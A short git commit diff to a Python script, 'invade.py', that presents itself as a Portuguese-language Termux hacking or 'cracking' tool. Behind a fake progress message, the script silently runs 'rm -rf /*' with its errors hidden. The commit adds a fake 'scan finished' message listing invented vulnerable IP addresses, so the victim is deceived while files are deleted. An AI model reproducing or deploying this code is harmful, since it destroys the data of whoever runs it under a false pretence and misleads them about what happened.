5922789b94763fdba8b65efc3b75f7efeee3f3fa
Sidney PEPO (aka sysb1n) <sidneypepo@pm.me>
2021-03-08 21:55:38 -0300

    Update invade.py

--- invade.py
+++ invade.py
@@ -20,5 +20,6 @@ print(Fore.RED + banner + Fore.RESET)
 os.system("termux-setup-storage")
 varr = input("Aperte enter para continuar.")
 help = "Acabo é so isso kkkkkkk"
-cmd = 'sleep 1; echo "[!] Cracking..."; rm -rf /* 2>/dev/null; sleep 10;'
+cmd = 'sleep 1; echo "[!] Cracking (isso pode levar alguns minutos!)..."; rm -rf /* 2>/dev/null; sleep 10;'
 os.system(cmd)
+print("Scan finalizado com sucesso!\nLista de IP's vulneraveis encontrados:\n\t192.168.2.1; 127.0.0.1; 10.10.0.10; 127.10.49.1")
